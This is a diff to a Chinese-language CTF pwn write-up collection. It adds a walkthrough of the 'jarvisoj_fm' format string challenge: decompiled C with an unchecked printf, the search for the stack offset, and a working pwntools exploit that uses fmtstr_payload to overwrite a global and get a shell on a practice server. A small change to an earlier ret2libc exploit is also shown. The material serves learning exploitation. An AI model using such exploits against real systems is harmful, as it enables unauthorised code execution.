@@ -391,6 +391,7 @@ payload2=b'a'*(0xe7+4)+p32(write_plt)+p32(main_addr)+p32(1)+p32(write_got)+p32(4
 #write（1，write_got，4），write的返回地址为main
 r.sendline(payload2)
 write_addr=u32(r.recv(4))
+#u32(io.recvuntil("\xf7")[-4:])
 print(hex(write_addr))
 libc=LibcSearcher('write',write_addr)#寻找libc版本
 libc_base=write_addr-libc.dump('write')#寻找基址
@@ -652,3 +653,52 @@ r.recvuntil('Exit\n:')
 r.sendline(str(4))
 r.interactive()
 ```
+
+## jarvisoj_fm
+
+>知识点：格式化字符串漏洞
+
+![alt text](image-19.png)
+```c
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  char buf[80]; // [esp+2Ch] [ebp-5Ch] BYREF
+  unsigned int v5; // [esp+7Ch] [ebp-Ch]
+
+  v5 = __readgsdword(0x14u);
+  be_nice_to_people();
+  memset(buf, 0, sizeof(buf));
+  read(0, buf, 0x50u);
+  printf(buf);
+  printf("%d!\n", x);
+  if ( x == 4 )
+  {
+    puts("running sh...");
+    system("/bin/sh");
+  }
+  return 0;
+}
+```
+很容易知道，让x=4就可以得到flag了，但这是第一次做到格式化字符串得问题，不了解就先看wp了，
+对于格式化字符串漏洞第一步就是去查看这个输入的偏移量，这里可以输入aaaa %x %x %x...这样的字符串，因为他的printf前面没有格式化字符，所以对于输入的结果会按照这个格式化字符依次输出栈上的内容，那么我们就可以去得到这个输入在栈上的位置
+![alt text](image-20.png)
+可以看到其偏移量是11，因为0x61616161是我输入a的16进制结果
+那么这个偏移量有什么用呢，下面就必须分析一个超级牛逼的函数：
+fmtstr_payload(offset,writes)
+这个函数还有一些其他参数，但是由于这道题不需要知道那么多，所以知道这两个参数怎么用就可以了，第一个参数就是偏移量，就是我们上面得到的结果，他的值是11.第二个就非常牛逼了，它是一个字典，它的键是地址，然后值可以任意，最后可以将对应地址的值改为这个任意值。
+![alt text](image-21.png)
+exp：
+```python
+from pwn import *
+
+r=remote("node5.buuoj.cn",'27939')
+
+x_adr=0x0804A02C 
+#r.recvuntil('your name:')
+#r.sendline('-1')
+#r.recvuntil('u name?')
+payload=fmtstr_payload(offset=11,writes={x_adr:4})
+r.sendline(payload)
+r.interactive()
+```
+原理看这个[格式化字符串漏洞原理及其利用（附带pwn例题讲解）](https://blog.csdn.net/qq_73985089/article/details/137199087?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522c033af0c7c8af025b367d901cdc821e4%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=c033af0c7c8af025b367d901cdc821e4&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-137199087-null-null.142^v102^pc_search_result_base5&utm_term=%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E&spm=1018.2226.3001.4187)
